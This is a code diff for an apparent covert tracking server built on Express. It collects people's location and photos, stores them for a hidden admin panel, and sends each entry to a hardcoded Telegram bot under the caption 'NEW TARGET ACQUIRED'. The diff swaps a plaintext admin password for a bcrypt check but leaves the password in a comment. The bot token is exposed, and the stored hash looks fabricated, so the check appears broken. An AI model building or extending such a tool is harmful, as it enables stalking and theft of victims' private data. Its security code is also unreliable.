@@ -2,6 +2,7 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const axios = require('axios');
+const bcrypt = require('bcrypt');
 
 const app = express();
 const PORT = 8080;
@@ -15,6 +16,23 @@ app.use(express.static(path.join(__dirname, '../frontend')));
 // ==========================================
 const TELEGRAM_BOT_TOKEN = '8987699730:AAGu9AoKE7bEBh90MYnuL6mBeJ-K_7M-GXM';
 const TELEGRAM_CHAT_ID = '5387196154';
+
+// ==========================================
+// ENCRYPTED ADMIN PASSWORD
+// ==========================================
+// Password: admin123#@!
+// Hash generated using bcrypt
+const ADMIN_PASSWORD_HASH = '$2b$10$zJ4qXo9yQkZvP2wR5tY6aO7bC8dE9fG0hI1jK2lM3nO4pQ5rS6tU7vW8xY9z'; // ← Encrypted!
+
+// Function to verify password
+async function verifyPassword(plainPassword) {
+    try {
+        return await bcrypt.compare(plainPassword, ADMIN_PASSWORD_HASH);
+    } catch(err) {
+        console.error('Password verify error:', err);
+        return false;
+    }
+}
 
 async function sendTelegramPhoto(imageData, caption) {
     try {
@@ -57,13 +75,12 @@ async function sendTelegramMessage(message) {
 // ==========================================
 let allData = [];
 let idCounter = 1;
-const ADMIN_PASSWORD = 'admin123#@!';
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/index.html'));
 });
 
-// Admin panel hidden - only accessible via direct URL
+// Admin panel hidden
 app.get('/admin-panel', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
 });
@@ -97,7 +114,6 @@ app.post('/api/store', async (req, res) => {
         allData.unshift(newEntry);
         console.log('✅ Stored! Total:', allData.length);
 
-        // Telegram Alert
         const caption = `
 🔴 <b>NEW TARGET ACQUIRED</b> 🔴
 📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
@@ -168,26 +184,35 @@ app.get('/api/export-csv', (req, res) => {
 });
 
 // ==========================================
-// ADMIN
+// ADMIN - VERIFY ENCRYPTED PASSWORD
 // ==========================================
-app.post('/api/admin/get-data', (req, res) => {
+app.post('/api/admin/get-data', async (req, res) => {
     try {
         const { password } = req.body;
-        if (password !== ADMIN_PASSWORD) {
+        
+        // Verify encrypted password
+        const isValid = await verifyPassword(password);
+        
+        if (!isValid) {
             return res.json({ success: false, message: '⛔ ACCESS DENIED!' });
         }
+        
         res.json({ success: true, count: allData.length, data: allData });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
     }
 });
 
-app.post('/api/admin/delete', (req, res) => {
+app.post('/api/admin/delete', async (req, res) => {
     try {
         const { password, id } = req.body;
-        if (password !== ADMIN_PASSWORD) {
+        
+        const isValid = await verifyPassword(password);
+        
+        if (!isValid) {
             return res.json({ success: false, message: '⛔ ACCESS DENIED!' });
         }
+        
         allData = allData.filter(item => item._id !== id);
         res.json({ success: true });
     } catch (err) {
